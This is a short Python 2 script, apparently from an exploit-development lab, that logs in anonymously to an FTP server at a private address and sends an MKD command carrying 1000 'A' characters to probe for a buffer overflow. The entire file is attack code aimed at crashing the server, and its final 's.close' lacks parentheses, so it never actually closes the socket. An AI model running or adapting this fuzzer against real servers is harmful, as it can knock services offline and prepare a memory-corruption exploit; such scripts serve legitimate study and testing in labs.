#!/usr/bin/python
 
import socket
import sys

# send 1000 A's to the server
fuzz = "A"*1000

# create a socket object to connect with the server 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('172.16.188.131',21))
 
# wait for the server to respond
s.recv(1024)
#send user name
s.send('USER anonymous\r\n')

# wait for the server to respond
s.recv(1024)
# send the password
s.send('PASS anonymous\r\n')

# wait for the server to respond
s.recv(1024)
#use the MKD command to fuzz the server
s.send('MKD ' + fuzz + '\r\n')

s.recv(1024)
s.send('QUIT\r\n')
s.close
